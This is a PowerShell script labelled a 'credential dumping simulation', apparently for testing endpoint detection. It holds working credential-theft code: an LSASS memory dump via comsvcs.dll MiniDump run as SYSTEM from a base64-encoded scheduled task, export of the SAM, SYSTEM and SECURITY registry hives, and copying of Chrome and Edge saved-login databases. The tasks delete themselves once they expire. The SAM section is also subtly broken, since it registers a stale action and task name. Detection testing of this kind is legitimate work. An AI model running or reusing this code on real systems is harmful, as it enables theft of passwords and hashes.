param(
    [string]$OutputPath = "$env:TEMP\creddump",
    [switch]$CleanUp,
    [switch]$skipLsass,
    [switch]$skipSam,
    [switch]$skipBrowser,
    [switch]$Force
)

<#
.SYNOPSIS
Creates a scheduled task that executes a PowerShell script.

.DESCRIPTION
This function creates a scheduled task with various trigger options (logon, daily, once, etc.).
The task will execute a PowerShell script with specified parameters.

.PARAMETER ScriptPath
The full path to the PowerShell script that will be executed by the scheduled task.

.PARAMETER TaskName
The name of the scheduled task to create.

.PARAMETER TriggerType
The type of trigger for the task. Valid values: 'AtLogon', 'Daily', 'Once', 'AtStartup'

.PARAMETER TriggerTime
For Daily or Once triggers, the time to execute. Defaults to current time + 1 minute.

.PARAMETER RunAsSystem
If specified, the task will run under SYSTEM account instead of current user.

.PARAMETER Hidden
If specified, the PowerShell window will be hidden during execution.

.PARAMETER Description
Optional description for the scheduled task.

.EXAMPLE
New-ScheduledTaskForScript -ScriptPath "C:\Scripts\MyScript.ps1" -TaskName "MyTask" -TriggerType "AtLogon"

.EXAMPLE
New-ScheduledTaskForScript -ScriptPath "$env:TEMP\script.ps1" -TaskName "DailyTask" -TriggerType "Daily" -TriggerTime "14:00" -Hidden

.NOTES
Requires administrative privileges for certain trigger types and RunAsSystem option.
#>
function New-ScheduledTaskForScript {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory = $true)]
        [string]$ScriptPath,
        
        [Parameter(Mandatory = $true)]
        [string]$TaskName,
        
        [Parameter(Mandatory = $false)]
        [ValidateSet('AtLogon', 'Daily', 'Once', 'AtStartup')]
        [string]$TriggerType = 'AtLogon',
        
        [Parameter(Mandatory = $false)]
        [string]$TriggerTime,
        
        [Parameter(Mandatory = $false)]
        [switch]$RunAsSystem,
        
        [Parameter(Mandatory = $false)]
        [switch]$Hidden,
        
        [Parameter(Mandatory = $false)]
        [string]$Description = "Scheduled task created by script"
    )
    
    try {
        # Validate script path exists
        if (-not (Test-Path -Path $ScriptPath)) {
            Write-Warning "Script path does not exist: $ScriptPath"
        }
        
        # Build PowerShell arguments
        $psArgs = "-NoProfile -ExecutionPolicy Bypass -File `"$ScriptPath`""
        if ($Hidden) {
            $psArgs = "-WindowStyle Hidden $psArgs"
        }
        
        # Create an action to run PowerShell
        $Action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument $psArgs
        
        # Create trigger based on type
        switch ($TriggerType) {
            'AtLogon' {
                $Trigger = New-ScheduledTaskTrigger -AtLogon
            }
            'AtStartup' {
                $Trigger = New-ScheduledTaskTrigger -AtStartup
            }
            'Daily' {
                if ($TriggerTime) {
                    $Trigger = New-ScheduledTaskTrigger -Daily -At $TriggerTime
                } else {
                    $Trigger = New-ScheduledTaskTrigger -Daily -At (Get-Date).AddMinutes(1)
                }
            }
            'Once' {
                if ($TriggerTime) {
                    $Trigger = New-ScheduledTaskTrigger -Once -At $TriggerTime
                } else {
                    $Trigger = New-ScheduledTaskTrigger -Once -At (Get-Date).AddMinutes(1)
                }
            }
        }
        
        # Create settings for the task
        $Settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable
        
        # Determine principal (user context)
        if ($RunAsSystem) {
            $Principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest
        } else {
            $Principal = New-ScheduledTaskPrincipal -UserId $env:USERNAME -LogonType Interactive -RunLevel Highest
        }
        
        # Check if task already exists
        $existingTask = Get-ScheduledTask -TaskName $TaskName -ErrorAction SilentlyContinue
        if ($existingTask) {
            Write-Warning "Task '$TaskName' already exists. Removing it..."
            Unregister-ScheduledTask -TaskName $TaskName -Confirm:$false
        }
        
        # Register the scheduled task
        $Task = Register-ScheduledTask -TaskName $TaskName `
            -Action $Action `
            -Trigger $Trigger `
            -Settings $Settings `
            -Principal $Principal `
            -Description $Description `
            -ErrorAction Stop
        
        Write-Host "[+] Scheduled task '$TaskName' created successfully!" -ForegroundColor Green
        Write-Host "[*] Task Name: $TaskName" -ForegroundColor Cyan
        Write-Host "[*] Script Path: $ScriptPath" -ForegroundColor Cyan
        Write-Host "[*] Trigger Type: $TriggerType" -ForegroundColor Cyan
        if ($TriggerTime) {
            Write-Host "[*] Trigger Time: $TriggerTime" -ForegroundColor Cyan
        }
        Write-Host "[*] Run As: $(if ($RunAsSystem) { 'SYSTEM' } else { $env:USERNAME })" -ForegroundColor Cyan
        
        return $Task
    }
    catch {
        Write-Error "Failed to create scheduled task: $_"
        return $null
    }
}

# Warning prompt
if (!$CleanUp -and !$Force) {
    Write-Host "`n==================================================================" -ForegroundColor Yellow
    Write-Host "                        ***  WARNING  *** " -ForegroundColor Red
    Write-Host "              Credential Dumping Simulation Script" -ForegroundColor Yellow
    Write-Host "==================================================================" -ForegroundColor Yellow
    Write-Host "`nThis script performs credential dumping simulations that will:" -ForegroundColor Yellow
    Write-Host "  - Dump LSASS process memory (mimics Mimikatz behavior)" -ForegroundColor Red
    Write-Host "  - Extract SAM, SYSTEM, and SECURITY registry hives" -ForegroundColor Red
    Write-Host "  - Access browser credential databases" -ForegroundColor Red
    Write-Host "`nThese actions may trigger Microsoft Defender for Endpoint to:" -ForegroundColor Yellow
    Write-Host "  - Flag this device as compromised" -ForegroundColor Magenta
    Write-Host "  - ISOLATE THE DEVICE from the network" -ForegroundColor Magenta
    Write-Host "  - Generate critical security alerts" -ForegroundColor Magenta
    Write-Host "`nYour account may be subject to investigation and remediation." -ForegroundColor Yellow
    Write-Host "  - You should not run this script with a critical account." -ForegroundColor Yellow
    Write-Host "  - You should run this script with a testing account." -ForegroundColor Yellow
    Write-Host "==================================================================" -ForegroundColor Yellow
    Write-Host "`nUse -Force parameter to skip this prompt." -ForegroundColor Gray
    Write-Host "`n"
    
    $confirmation = Read-Host "Do you want to continue? (Type 'YES' to proceed)"
    
    if ($confirmation -ne "YES") {
        Write-Host "`nOperation cancelled by user." -ForegroundColor Green
        exit
    }
    
    Write-Host "`nProceeding with credential dumping simulation..." -ForegroundColor Yellow
    Start-Sleep -Seconds 2
}

if ($CleanUp) {
    Remove-Item -Path $OutputPath -Recurse -Force -ErrorAction Ignore
    
    # Remove LSASS dump scheduled task if it exists
    $taskName = "LsassDumpTask"
    $existingTask = Get-ScheduledTask -TaskName $taskName -ErrorAction SilentlyContinue
    if ($existingTask) {
        Write-Host "Removing scheduled task '$taskName'..." -ForegroundColor Yellow
        Unregister-ScheduledTask -TaskName $taskName -Confirm:$false
    }
    
    # Remove SAM dump scheduled task if it exists
    $taskName = "SamDumpTask"
    $existingTask = Get-ScheduledTask -TaskName $taskName -ErrorAction SilentlyContinue
    if ($existingTask) {
        Write-Host "Removing scheduled task '$taskName'..." -ForegroundColor Yellow
        Unregister-ScheduledTask -TaskName $taskName -Confirm:$false
    }
    
    # Remove Browser dump scheduled task if it exists
    $taskName = "BrowserDumpTask"
    $existingTask = Get-ScheduledTask -TaskName $taskName -ErrorAction SilentlyContinue
    if ($existingTask) {
        Write-Host "Removing scheduled task '$taskName'..." -ForegroundColor Yellow
        Unregister-ScheduledTask -TaskName $taskName -Confirm:$false
    }
}
else {
    if (!$skipLsass) {
        # Perform LSASS Dumping Attempt via Scheduled Task
        Write-Host "Running LSASS Simulation via Scheduled Task" -ForegroundColor Yellow
        
        # Create output directory if it doesn't exist
        if (-not (Test-Path -Path $OutputPath)) {
            New-Item -Path $OutputPath -ItemType Directory -Force | Out-Null
        }
        
        # Create a PowerShell script that will be executed by the scheduled task
        $lsassDumpScript = @"
# Initialize log file
`$logFile = "$OutputPath\lsass-dump.log"
`$timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"

# Log function
function Write-Log {
    param([string]`$Message)
    "`$timestamp - `$Message" | Out-File -FilePath `$logFile -Append -Encoding utf8
}

Write-Log "Starting LSASS dump process"

# Get LSASS Process ID
try {
    `$lsassPID = (Get-Process -Name lsass).Id
    Write-Log "LSASS PID: `$lsassPID"
} catch {
    Write-Log "ERROR: Failed to get LSASS process ID - `$_"
    exit 1
}

# Execute the dump using rundll32
`$outputFile = "$OutputPath\lsas-out.dmp"
Write-Log "Dumping to: `$outputFile"

try {
    cmd.exe /C "C:\Windows\System32\rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump `$lsassPID `$outputFile full" 2>&1 | Out-File -FilePath `$logFile -Append -Encoding utf8
    
    if (Test-Path -Path `$outputFile) {
        `$fileSize = (Get-Item `$outputFile).Length
        Write-Log "SUCCESS: LSASS dump completed successfully! File size: `$fileSize bytes"
    } else {
        Write-Log "ERROR: LSASS dump failed - output file not found"
    }
} catch {
    Write-Log "ERROR: Exception during dump execution - `$_"
}

Write-Log "LSASS dump process completed"
"@
        
        # Encode the script to base64
        $encodedScript = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($lsassDumpScript))
        
        # Save the base64 encoded script to a file
        $encodedScriptPath = "$OutputPath\lsass-dump-encoded.txt"
        Set-Content -Path $encodedScriptPath -Value $encodedScript -Force
        Write-Host "Created base64 encoded script: $encodedScriptPath" -ForegroundColor Cyan
        
        # Create scheduled task with the script
        $taskName = "LsassDumpTask"
        $taskDescription = "LSASS dump task for credential simulation"
        
        # Create the action that reads the base64 file, decodes it, and executes
        $decoderCommand = @"
`$encodedContent = Get-Content -Path '$encodedScriptPath' -Raw
`$decodedScript = [System.Text.Encoding]::Unicode.GetString([Convert]::FromBase64String(`$encodedContent))
Invoke-Expression `$decodedScript
"@
        
        $psCommand = "-NoProfile -ExecutionPolicy Bypass -Command `"$decoderCommand`""
        $Action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument $psCommand
        
        # Create trigger to run immediately
        $Trigger = New-ScheduledTaskTrigger -Once -At (Get-Date).AddSeconds(5)
        
        # Create settings
        $Settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable -DeleteExpiredTaskAfter 00:00:01
        
        # Create principal to run as SYSTEM for elevated privileges
        $Principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest
        
        # Remove existing task if present
        $existingTask = Get-ScheduledTask -TaskName $taskName -ErrorAction SilentlyContinue
        if ($existingTask) {
            Write-Host "Removing existing task '$taskName'..." -ForegroundColor Yellow
            Unregister-ScheduledTask -TaskName $taskName -Confirm:$false
        }
        
        # Register the scheduled task
        try {
            Register-ScheduledTask -TaskName $taskName `
                -Action $Action `
                -Trigger $Trigger `
                -Settings $Settings `
                -Principal $Principal `
                -Description $taskDescription `
                -ErrorAction Stop | Out-Null
            
            Write-Host "[+] Scheduled task '$taskName' created successfully!" -ForegroundColor Green
            Write-Host "[*] Task will execute in 5 seconds..." -ForegroundColor Cyan
            
            # Wait for task to complete
            Start-Sleep -Seconds 7
            
            # Check if dump file was created
            if (Test-Path -Path "$OutputPath\lsas-out.dmp") {
                Write-Host "[+] LSASS dump completed successfully!" -ForegroundColor Green
            } else {
                Write-Host "[-] LSASS dump may have failed. Check task history." -ForegroundColor Yellow
            }
            
            # Clean up the encoded script
            Remove-Item -Path $encodedScriptPath -Force -ErrorAction SilentlyContinue
        }
        catch {
            Write-Error "Failed to create or execute scheduled task: $_"
        }
    }

    if (!$skipSam) {
        # SAM Dumping via Scheduled Task
        Write-Host "Running SAM Dumping Simulation via Scheduled Task" -ForegroundColor Yellow
        
        # Create scheduled task with the script
        $samTaskName = "SamDumpTask"
        $systemTaskName = "SystemDumpTask"
        $securityTaskName = "SecurityDumpTask"
        $taskDescription = "SAM registry hive dump task for credential simulation"
        
        # Create the action with the script content inline
        $samAction = New-ScheduledTaskAction -Execute "reg.exe" -Argument "save HKLM\sam `"$OutputPath\sam`" /y"
        $systemAction = New-ScheduledTaskAction -Execute "reg.exe" -Argument "save HKLM\system `"$OutputPath\system`" /y"
        $securityAction = New-ScheduledTaskAction -Execute "reg.exe" -Argument "save HKLM\security `"$OutputPath\security`" /y"
        
        $Trigger = New-ScheduledTaskTrigger -Once -At (Get-Date).AddSeconds(5)
        
        # Create settings
        $Settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable -DeleteExpiredTaskAfter 00:00:01
        
        # Create principal to run as SYSTEM for elevated privileges
        $Principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest
        
        # Remove existing task if present
        $existingTask = Get-ScheduledTask -TaskName $taskName -ErrorAction SilentlyContinue
        if ($existingTask) {
            Write-Host "Removing existing task '$taskName'..." -ForegroundColor Yellow
            Unregister-ScheduledTask -TaskName $taskName -Confirm:$false
        }
        
        # Register the scheduled task
        try {
            Register-ScheduledTask -TaskName $taskName `
                -Action $Action `
                -Trigger $Trigger `
                -Settings $Settings `
                -Principal $Principal `
                -Description $taskDescription `
                -ErrorAction Stop | Out-Null
            
            Write-Host "[+] Scheduled task '$taskName' created successfully!" -ForegroundColor Green
            Write-Host "[*] Task will execute in 5 seconds..." -ForegroundColor Cyan
            
            # Wait for task to complete
            Start-Sleep -Seconds 7
            
            # Check if dump files were created
            $dumpFiles = @("$OutputPath\sam", "$OutputPath\system", "$OutputPath\security")
            $successCount = 0
            foreach ($file in $dumpFiles) {
                if (Test-Path -Path $file) {
                    $successCount++
                }
            }
            
            if ($successCount -eq 3) {
                Write-Host "[+] SAM dump completed successfully! All 3 hives extracted." -ForegroundColor Green
            } elseif ($successCount -gt 0) {
                Write-Host "[!] SAM dump partially completed. $successCount of 3 hives extracted." -ForegroundColor Yellow
            } else {
                Write-Host "[-] SAM dump may have failed. Check log file: $OutputPath\sam-dump.log" -ForegroundColor Yellow
            }
        }
        catch {
            Write-Error "Failed to create or execute scheduled task: $_"
        }
    }

    if (!$skipBrowser) {
        # Browser Credential Dumping via Scheduled Task
        Write-Host "Running BrowserDump Simulation via Scheduled Task" -ForegroundColor Yellow
        
        # Create a PowerShell script that will be executed by the scheduled task
        $browserDumpScript = @"
# Initialize log file
`$logFile = "$OutputPath\browser-dump.log"
`$timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"

# Log function
function Write-Log {
    param([string]`$Message)
    "`$timestamp - `$Message" | Out-File -FilePath `$logFile -Append -Encoding utf8
}

Write-Log "Starting browser credential dump process"

# Chrome Login Data
try {
    `$chromeLoginData = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data"
    `$outputFile = "$OutputPath\Chrome_Login_Data.tmp"
    
    if (Test-Path `$chromeLoginData) {
        Write-Log "Dumping Chrome Login Data from: `$chromeLoginData"
        `$result = esentutl.exe /y "`$chromeLoginData" /d "`$outputFile" 2>&1
        Write-Log "Chrome Login Data dump result: `$result"
        
        if (Test-Path `$outputFile) {
            `$fileSize = (Get-Item `$outputFile).Length
            Write-Log "SUCCESS: Chrome Login Data dumped successfully! File size: `$fileSize bytes"
        } else {
            Write-Log "ERROR: Chrome Login Data dump failed - output file not found"
        }
    } else {
        Write-Log "WARNING: Chrome Login Data not found at: `$chromeLoginData"
    }
} catch {
    Write-Log "ERROR: Exception during Chrome Login Data dump - `$_"
}

# Chrome Login Data For Account
try {
    `$chromeLoginDataForAccount = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data For Account"
    `$outputFile = "$OutputPath\Chrome_Login_DataForAccount.tmp"
    
    if (Test-Path `$chromeLoginDataForAccount) {
        Write-Log "Dumping Chrome Login Data For Account from: `$chromeLoginDataForAccount"
        `$result = esentutl.exe /y "`$chromeLoginDataForAccount" /d "`$outputFile" 2>&1
        Write-Log "Chrome Login Data For Account dump result: `$result"
        
        if (Test-Path `$outputFile) {
            `$fileSize = (Get-Item `$outputFile).Length
            Write-Log "SUCCESS: Chrome Login Data For Account dumped successfully! File size: `$fileSize bytes"
        } else {
            Write-Log "ERROR: Chrome Login Data For Account dump failed - output file not found"
        }
    } else {
        Write-Log "WARNING: Chrome Login Data For Account not found at: `$chromeLoginDataForAccount"
    }
} catch {
    Write-Log "ERROR: Exception during Chrome Login Data For Account dump - `$_"
}

# Edge Login Data
try {
    `$edgeLoginData = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Login Data"
    `$outputFile = "$OutputPath\Edge_Login_Data.tmp"
    
    if (Test-Path `$edgeLoginData) {
        Write-Log "Dumping Edge Login Data from: `$edgeLoginData"
        `$result = esentutl.exe /y "`$edgeLoginData" /d "`$outputFile" 2>&1
        Write-Log "Edge Login Data dump result: `$result"
        
        if (Test-Path `$outputFile) {
            `$fileSize = (Get-Item `$outputFile).Length
            Write-Log "SUCCESS: Edge Login Data dumped successfully! File size: `$fileSize bytes"
        } else {
            Write-Log "ERROR: Edge Login Data dump failed - output file not found"
        }
    } else {
        Write-Log "WARNING: Edge Login Data not found at: `$edgeLoginData"
    }
} catch {
    Write-Log "ERROR: Exception during Edge Login Data dump - `$_"
}

Write-Log "Browser credential dump process completed"
"@
        
        # Create scheduled task with the script
        $taskName = "BrowserDumpTask"
        $taskDescription = "Browser credential dump task for credential simulation"
        
        # Create the action with the script content inline
        $psCommand = "-NoProfile -ExecutionPolicy Bypass -Command `"& { $browserDumpScript }`""
        $Action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument $psCommand
        
        # Create trigger to run immediately
        $Trigger = New-ScheduledTaskTrigger -Once -At (Get-Date).AddSeconds(5)
        
        # Create settings
        $Settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable -DeleteExpiredTaskAfter 00:00:01
        
        # Create principal to run as current user (browser data is user-specific)
        $Principal = New-ScheduledTaskPrincipal -UserId $env:USERNAME -LogonType Interactive -RunLevel Highest
        
        # Remove existing task if present
        $existingTask = Get-ScheduledTask -TaskName $taskName -ErrorAction SilentlyContinue
        if ($existingTask) {
            Write-Host "Removing existing task '$taskName'..." -ForegroundColor Yellow
            Unregister-ScheduledTask -TaskName $taskName -Confirm:$false
        }
        
        # Register the scheduled task
        try {
            Register-ScheduledTask -TaskName $taskName `
                -Action $Action `
                -Trigger $Trigger `
                -Settings $Settings `
                -Principal $Principal `
                -Description $taskDescription `
                -ErrorAction Stop | Out-Null
            
            Write-Host "[+] Scheduled task '$taskName' created successfully!" -ForegroundColor Green
            Write-Host "[*] Task will execute in 5 seconds..." -ForegroundColor Cyan
            
            # Wait for task to complete
            Start-Sleep -Seconds 7
            
            # Check if dump files were created
            $dumpFiles = @(
                "$OutputPath\Chrome_Login_Data.tmp",
                "$OutputPath\Chrome_Login_DataForAccount.tmp",
                "$OutputPath\Edge_Login_Data.tmp"
            )
            $successCount = 0
            foreach ($file in $dumpFiles) {
                if (Test-Path -Path $file) {
                    $successCount++
                }
            }
            
            if ($successCount -eq 3) {
                Write-Host "[+] Browser dump completed successfully! All 3 databases extracted." -ForegroundColor Green
            } elseif ($successCount -gt 0) {
                Write-Host "[!] Browser dump partially completed. $successCount of 3 databases extracted." -ForegroundColor Yellow
            } else {
                Write-Host "[-] Browser dump may have failed. Check log file: $OutputPath\browser-dump.log" -ForegroundColor Yellow
            }
        }
        catch {
            Write-Error "Failed to create or execute scheduled task: $_"
        }
    }
}